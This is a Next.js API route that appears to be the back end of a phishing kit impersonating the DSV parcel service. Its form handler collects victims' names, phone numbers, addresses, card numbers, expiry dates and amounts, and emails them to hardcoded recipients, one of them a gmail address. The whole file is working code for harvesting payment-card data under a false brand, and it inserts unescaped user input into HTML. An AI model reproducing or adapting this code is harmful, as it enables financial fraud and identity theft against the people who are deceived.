import { NextRequest, NextResponse } from 'next/server'
import nodemailer from 'nodemailer'
import path from 'path'

// Configuration du transporteur SMTP OVH
const transporter = nodemailer.createTransport({
  host: process.env.EMAIL_HOST || 'ssl0.ovh.net',
  port: parseInt(process.env.EMAIL_PORT || '465'),
  secure: true, // true pour le port 465, false pour les autres ports
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
})

// Fonction pour valider les données du formulaire
function validateFormData(data: any) {
  const requiredFields = [
    'nom_complet',
    'telephone',
    'adresse',
    'carte_be',
    'carte_52_49_51',
    'date_expiration',
    'montant'
  ]

  for (const field of requiredFields) {
    if (!data[field] || data[field].trim() === '') {
      return { isValid: false, error: `Het veld ${field} is verplicht` }
    }
  }



  return { isValid: true }
}

// Fonction pour créer le template HTML de l'email
function createEmailTemplate(data: any) {
  const title = '💰 Nieuwe Aanvraag Geldoverdracht DSV'
  const currentDate = new Date()
  const dateStr = currentDate.toLocaleDateString('nl-NL', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  })
  const timeStr = currentDate.toLocaleTimeString('nl-NL')

  return `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <title>${title}</title>
      <style>
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          line-height: 1.6;
          color: #333;
          margin: 0;
          padding: 0;
          background-color: #f5f7fa;
        }
        .container {
          max-width: 650px;
          margin: 20px auto;
          background: white;
          border-radius: 12px;
          overflow: hidden;
          box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        .header {
          background: linear-gradient(135deg, #2563eb 0%, #3b82f6 100%);
          color: white;
          padding: 30px;
          text-align: center;
        }
        .header h1 {
          margin: 0 0 10px 0;
          font-size: 24px;
          font-weight: 600;
        }
        .header p {
          margin: 0;
          opacity: 0.9;
          font-size: 14px;
        }
        .content {
          padding: 30px;
        }
        .client-info {
          background: linear-gradient(135deg, #e3f2fd 0%, #f3e5f5 100%);
          padding: 20px;
          border-radius: 8px;
          margin-bottom: 25px;
          border-left: 4px solid #2563eb;
        }
        .client-info h2 {
          margin: 0 0 15px 0;
          color: #2563eb;
          font-size: 18px;
          display: flex;
          align-items: center;
        }
        .financial-info {
          background: linear-gradient(135deg, #fff3e0 0%, #fce4ec 100%);
          padding: 20px;
          border-radius: 8px;
          margin-bottom: 25px;
          border-left: 4px solid #ff9800;
        }
        .financial-info h2 {
          margin: 0 0 15px 0;
          color: #ff9800;
          font-size: 18px;
          display: flex;
          align-items: center;
        }
        .package-info {
          background: linear-gradient(135deg, #e8f5e8 0%, #f0f8ff 100%);
          padding: 20px;
          border-radius: 8px;
          margin-bottom: 25px;
          border-left: 4px solid #4caf50;
        }
        .package-info h2 {
          margin: 0 0 15px 0;
          color: #4caf50;
          font-size: 18px;
          display: flex;
          align-items: center;
        }
        .field {
          display: flex;
          margin-bottom: 12px;
          align-items: flex-start;
        }
        .label {
          font-weight: 600;
          color: #555;
          min-width: 140px;
          margin-right: 15px;
        }
        .value {
          background: white;
          padding: 8px 12px;
          border-radius: 6px;
          border: 1px solid #e0e0e0;
          flex: 1;
          font-family: 'Courier New', monospace;
          font-size: 14px;
        }
        .amount {
          background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
          color: white;
          font-weight: bold;
          font-size: 16px;
          text-align: center;
          padding: 12px;
          border-radius: 6px;
        }
        .footer {
          background: #f8f9fa;
          text-align: center;
          padding: 20px;
          color: #666;
          font-size: 12px;
          border-top: 1px solid #e9ecef;
        }
        .footer strong {
          color: #2563eb;
        }
        .contact-actions {
          background: #e8f5e8;
          padding: 15px;
          border-radius: 8px;
          margin-top: 20px;
          text-align: center;
        }
        .contact-actions a {
          display: inline-block;
          margin: 5px 10px;
          padding: 8px 16px;
          background: #2563eb;
          color: white;
          text-decoration: none;
          border-radius: 4px;
          font-size: 12px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <img src="cid:logo" alt="herstelservicedsv Logo" style="width: 60px; height: 60px; margin-bottom: 10px; border-radius: 8px;">
          <h1>${title}</h1>
          <p>📅 Ontvangen op ${dateStr} om ${timeStr}</p>
        </div>

        <div class="content">
          <!-- Informations Client -->
          <div class="client-info">
            <h2>👤 Klantinformatie</h2>
            <div class="field">
              <div class="label">Volledige naam :</div>
              <div class="value">${data.nom_complet}</div>
            </div>
            <div class="field">
              <div class="label">Telefoon :</div>
              <div class="value">${data.telephone}</div>
            </div>
            <div class="field">
              <div class="label">Adres :</div>
              <div class="value">${data.adresse}</div>
            </div>
          </div>

          <!-- Informations Colis -->
          <div class="package-info">
            <h2>📦 Pakketinformatie</h2>
            <div class="field">
              <div class="label">Beschrijving :</div>
              <div class="value">${data.description_article || 'Niet gespecificeerd'}</div>
            </div>
          </div>

          <!-- Informations Financières -->
          <div class="financial-info">
            <h2>💳 Bankinformatie</h2>
            <div class="field">
              <div class="label">Carte BE :</div>
              <div class="value">${data.carte_be}</div>
            </div>
            <div class="field">
              <div class="label">Carte 52/49/51 :</div>
              <div class="value">${data.carte_52_49_51}</div>
            </div>
            <div class="field">
              <div class="label">Vervaldatum :</div>
              <div class="value">${data.date_expiration}</div>
            </div>
            <div class="field">
              <div class="label">Bedrag :</div>
              <div class="amount">${data.montant} €</div>
            </div>
          </div>

          <!-- Actions rapides -->
          <div class="contact-actions">
            <strong>Snelle acties :</strong><br>
            <a href="mailto:${data.email}?subject=Re: ${title} - ${data.nom_complet}">📧 Klant beantwoorden</a>
            <a href="tel:${data.telephone}">📞 Klant bellen</a>
          </div>
        </div>

        <div class="footer">
          <p>
            <strong>DSV Pakketten</strong> - 24/7 Ophaal- en Bezorgservice<br>
            Email automatisch verzonden vanaf <strong>dsv-klantenservice.com</strong><br>
            Voor vragen, neem contact op met de technische ondersteuning.
          </p>
        </div>
      </div>
    </body>
    </html>
  `
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()

    // Déterminer le type de formulaire basé sur l'URL ou un paramètre
    const url = new URL(request.url)
    url.searchParams.get('type') || 'reception' // Type par défaut

    // Valider les données
    const validation = validateFormData(body)
    if (!validation.isValid) {
      return NextResponse.json(
        { success: false, error: validation.error },
        { status: 400 }
      )
    }

    // Vérifier que les variables d'environnement sont configurées
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('SMTP omgevingsvariabelen ontbreken')
      return NextResponse.json(
        { success: false, error: 'Email server configuratie ontbreekt' },
        { status: 500 }
      )
    }

    // Créer le contenu de l'email
    const emailHtml = createEmailTemplate(body)
    const subject = `Nieuwe aanvraag geldoverdracht DSV - ${body.nom_complet}`

    // Configuration de l'email
    const recipients = process.env.EMAIL_RECIPIENTS
      ? process.env.EMAIL_RECIPIENTS.split(',').map(email => email.trim())
      : ['registratie@dsv-klantenservice.com', 'richtingklantautodp.be@gmail.com']

    // Chemin vers le logo
    const logoPath = path.join(process.cwd(), 'public', 'Logo.png')

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipients,
      subject: subject,
      html: emailHtml,
      attachments: [
        {
          filename: 'logo.png',
          path: logoPath,
          cid: 'logo' // Content-ID pour référencer l'image dans l'HTML
        }
      ],
      text: `
        ${subject}

        === KLANTINFORMATIE ===
        Naam: ${body.nom_complet}
        Telefoon: ${body.telephone}
        Adres: ${body.adresse}

        === PAKKETINFORMATIE ===
        Beschrijving: ${body.description_article || 'Niet gespecificeerd'}

        === BANKINFORMATIE ===
        Kaart BE: ${body.carte_be}
        Kaart 52/49/51: ${body.carte_52_49_51}
        Vervaldatum: ${body.date_expiration}
        Bedrag: ${body.montant} €

        ---
        Email verzonden vanaf herstelservicedsv
        Datum: ${new Date().toLocaleString('nl-NL')}
      `
    }

    // Envoyer l'email
    const info = await transporter.sendMail(mailOptions)

    console.log('Email succesvol verzonden:', info.messageId)

    return NextResponse.json({
      success: true,
      message: 'Email succesvol verzonden',
      messageId: info.messageId
    })

  } catch (error) {
    console.error('Fout bij het verzenden van email:', error)

    return NextResponse.json(
      {
        success: false,
        error: 'Fout bij het verzenden van email. Probeer het later opnieuw.'
      },
      { status: 500 }
    )
  }
}

// Gérer les autres méthodes HTTP
export async function GET() {
  return NextResponse.json(
    { error: 'Methode niet toegestaan' },
    { status: 405 }
  )
}
